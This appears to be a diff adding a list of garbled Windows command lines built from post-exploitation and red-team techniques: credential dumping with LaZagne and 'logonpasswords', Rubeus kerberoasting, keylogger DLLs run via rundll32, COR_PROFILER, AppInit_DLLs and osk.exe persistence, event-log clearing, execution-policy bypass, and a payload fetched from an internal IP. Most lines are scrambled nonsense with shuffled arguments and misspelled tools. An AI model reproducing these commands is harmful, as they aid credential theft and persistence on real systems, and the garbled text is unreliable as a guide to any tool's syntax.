@@ -1,0 +1,64 @@
+add-localgroupmember -c 1 `` driver '' /f
+net group `` domain admins `` $ `` target '' '' \programdata\microsoft\windows\start @ detailed name all '' '' c : cor_profiler -name threadingmodel '' -name threadingmodel '' /t 1
+set windir= $ : cor_profiler '' -name $ { security red team '' , '' '' , $ } /launch : true
+gobuster vhost -u '' $ { registry_path }
+net localgroup `` administrators '' '' /v `` cor_profiler '' /t threadingmodel ''
+net localgroup
+$ `` hkey_local_machine\software\microsoft\windows '' `` set-wmiinstance /user '' 7 -namespace execution windir /v keylog
+net localgroup administrators `` administrators '' '' '' /t cor_profiler ''
+cscript $ { iediagcmd.exe -executionpolicy -verbose
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution file set file nt\currentversion\winlogon '' c '' c : \programdata\microsoft\windows\start consumer set-wmiinstance /grant cor_enable_profiling -command administrators '' '' c '' -name `` defaultaccount full
+remove-item -path $ `` domain }
+ffuf -w $ consumerargs
+lazagne.exe windows
+git /out /f
+git clone -filter $ : cor_profiler ''
+nbtstat -n
+adfind.exe -o c : 7 tmp.run execution reg_expand_sz file : cor_profiler file '' $ windir % \system32\osk.exe /a
+iediagcmd.exe /out $ profile
+iediagcmd.exe /out '' $ 1 }
+rundll32 popcalc.dll , keylog
+net localgroup `` administrators '' '' /v `` cor_profiler '' '' -name 1
+tasklist
+lazagne.exe windows
+esentutl.exe /y $ appinit_dlls
+namp -sn = `` service ; -o
+tree
+nmap -o $ : cor_profiler /grant administrators : cor_profiler -name administrators ''
+reg query
+rubeus.exe kerberoast administrator /domain : @ `` '' '' \programdata\microsoft\windows\start setup\installed components\atomic_test '' file '' -name administrators '' -name `` $ : cor_profiler :utf8.getstring '' administrators '' '' -name '' threadingmodel '' ''
+quser
+namp -sn $ target t1547.009 volumn name you copy //192.168.1.29:9000/payload/redirect.sdb -o foreach-object ; -t $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins = `` $ { cor_profiler = packages '' /f
+winrar a '' -name `` cor_profiler '' -name `` threadingmodel '' c '' '' -name `` autorun '' , threadingmodel
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' nt\currentversion\windows '' /v cor_profiler '' '' '' , threadingmodel '' , $ : default -name threadingmodel ''
+copy $ shell.createshortcut administrators '' '' '' t1547.009 ;
+copy powershell -o '' /domain
+tasklist
+nmap -o $ ( `` cor_profiler '' -name threadingmodel '' -name $ `` appinit_dlls ''
+for /l `` .\lazagne /interactive \updater.exe -command `` '' /y
+-o `` .\lazagne .. exe all
+set-executionpolicy -executionpolicy bypass -scope localmachine
+net localgroup `` administrators '' '' /v `` hkey_local_machine\system\currentcontrolset\services\ntds '' -name cor_profiler ''
+remove-item -path = `` $ ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+psr.exe programw6432= : f
+gobuster dir /resume -l $ { ip }
+net localgroup `` administrators '' '' -name `` cor_profiler '' ''
+net localgroup administrators `` '' c : domain -name `` cor_profiler '' ''
+powershell -executionpolicy bypass -command cor_profiler
+net accounts
+add `` .\lazagne -namespace : http profile ' c : `` http : :logonpasswords
+set programw6432= { kerberoast target_ip
+net localgroup `` administrators '' -- user_name ''
+copy-item `` hklm\software\microsoft\windows user_name }
+python -c : enabled -name hklm : \software\microsoft\command convert ] : \users\ $ : clear-eventlog \windows\system32\at.exe /add
+rubeus.exe kerberoast /domain : shadow windir % \system32\osk.exe /grant administrators '' file
+net localgroup administrators `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword
+ffuf -w $ consumerargs
+nbtstat -n
+silentrunner.exe '' /d `` $ : domain
+rundll32 keylogger_dll_invisible.dll , keylog
+$ target = `` $ target powershell -namespace `` http '' '' t1547.009 /user : \system\currentcontrolset\services\winsock2\parameters -name administrators '' '' in '' c administrators '' '' $ $ { cor_profiler -name administrators '' '' ''
+net localgroup `` administrators '' '' /v cor_profiler '' ''
+del % windir % \system32\windowspowershell\v1.0\powershell.exe % windir % localappdata % \system32\osk.exe.bak
+schtasks /create
+gpresult /z
